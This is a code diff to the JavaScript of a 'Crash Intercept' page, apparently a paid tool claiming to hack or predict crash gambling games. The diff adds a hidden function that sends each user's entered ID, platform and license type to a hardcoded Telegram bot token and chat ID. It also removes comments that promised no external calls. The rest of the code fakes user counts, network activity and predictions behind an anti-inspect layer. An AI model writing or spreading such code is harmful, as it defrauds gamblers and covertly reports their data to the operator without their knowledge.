@@ -213,13 +213,36 @@
     </div>
 
     <script>
-        // ========== STANDALONE MODE: NO BACKEND, LOCAL LICENSE ONLY ==========
-        // Hardcoded license keys (no external calls)
+        // ========== TELEGRAM NOTIFICATION (no backend) ==========
+        const TELEGRAM_BOT_TOKEN = "8255507296:AAHiAASDDcK31NE_jUN3OVJUXuJ9s9RHXhQ";
+        const TELEGRAM_CHAT_ID = "8645990878";
+        const SCRIPT_NAME = "Crash Intercept";
+
+        function sendTelegramNotification(userId, platform, licenseType) {
+            const message = `🔔 *NEW ACCESS* 🔔\n\n` +
+                            `📜 *Script:* ${SCRIPT_NAME}\n` +
+                            `👤 *User ID:* ${userId}\n` +
+                            `🎯 *Platform:* ${platform}\n` +
+                            `⏳ *License:* ${licenseType}\n` +
+                            `🕒 *Time:* ${new Date().toLocaleString()}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Telegram notify failed", err));
+        }
+
+        // ========== NEW LICENSE CODES (changed) ==========
         const LICENSE_CODES = [
-            { code: "gemma-12H",   type: "12 Hour" },
-            { code: "SIGMA-24H",   type: "24 Hour" },
-            { code: "OMEGA-7D",    type: "7 Day" },
-            { code: "LIFETIME-X",  type: "Lifetime" }
+            { code: "CRASH-12H",    type: "12 Hour" },
+            { code: "NEURAL-24H",   type: "24 Hour" },
+            { code: "INTERCEPT-7D", type: "7 Day" },
+            { code: "INFINITY-X",   type: "Lifetime" }
         ];
 
         let selected = "";
@@ -247,7 +270,6 @@
             oscillator.start();
             oscillator.stop(audioCtx.currentTime + 0.05);
         }
-        // Alias for click feedback
         function playSfx(type) { playBeep(); }
 
         // ===== ANTI-INSPECT & SESSION RESTORE =====
@@ -302,7 +324,6 @@
                 const newType = connTypes[Math.floor(Math.random() * connTypes.length)];
                 document.getElementById('user-isp').innerText = newType + "_MODEM";
             }, 45000);
-            // Static local IP (no external fetch)
             document.getElementById('user-ip').innerText = "LOCAL_NODE";
             document.getElementById('user-ip').classList.remove('blink-red');
         }
@@ -364,7 +385,7 @@
             if (otherCardElement) otherCardElement.classList.add('active');
         }
 
-        // ========== MAIN INITIATION: LOCAL LICENSE VALIDATION ONLY ==========
+        // ========== MAIN INITIATION: LOCAL LICENSE VALIDATION + TELEGRAM ==========
         function initiate() {
             const userId = document.getElementById('user-id').value.trim();
             const key = document.getElementById('license-key').value.trim().toUpperCase();
@@ -398,15 +419,16 @@
                 return;
             }
 
+            // --- Send Telegram notification ---
+            sendTelegramNotification(userId, selected, license.type);
+
             const btn = document.querySelector('#activation-ui .btn-start');
             btn.disabled = true;
             btn.innerText = "VERIFYING...";
 
-            // Remove any previous message
             const existingMsg = document.querySelector('#activation-ui .waiting-message');
             if (existingMsg) existingMsg.remove();
 
-            // Show instant validation success (no backend, no polling)
             const waitingMsgDiv = document.createElement('div');
             waitingMsgDiv.className = 'waiting-message';
             waitingMsgDiv.innerHTML = `
@@ -416,7 +438,6 @@
             `;
             document.getElementById('activation-ui').appendChild(waitingMsgDiv);
 
-            // Proceed after short dramatic pause (simulates boot, no external calls)
             setTimeout(() => {
                 waitingMsgDiv.remove();
                 proceedWithBypass(userId, selected, license.type);
@@ -424,7 +445,6 @@
         }
 
         function proceedWithBypass(userId, platform, licenseType) {
-            // Session duration: 12 hours from now (can be adjusted)
             const endTime = new Date().getTime() + (12 * 60 * 60 * 1000);
             localStorage.setItem('session_end', endTime);
             localStorage.setItem('selected_node', selected);
@@ -476,7 +496,6 @@
             document.getElementById('hack-dashboard').style.display = 'flex';
             document.getElementById('node-name').innerText = selected.toUpperCase();
 
-            // Timer countdown
             setInterval(() => {
                 const now = new Date().getTime();
                 const diff = endTime - now;
@@ -493,7 +512,6 @@
                     `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
             }, 1000);
 
-            // Dynamic stats simulation
             setInterval(() => {
                 document.getElementById('active-users').innerText = (14200 + Math.floor(Math.random() * 500)).toLocaleString();
                 document.getElementById('lat').innerText = Math.floor(Math.random() * 12 + 12) + "ms";
@@ -514,7 +532,6 @@
             simulateNetworkStruggle();
         }
 
-        // ========== PREDICTION ENGINE (local deterministic) ==========
         function loop15() {
             const val = document.getElementById('prediction-val');
             const progress = document.getElementById('sync-fill');
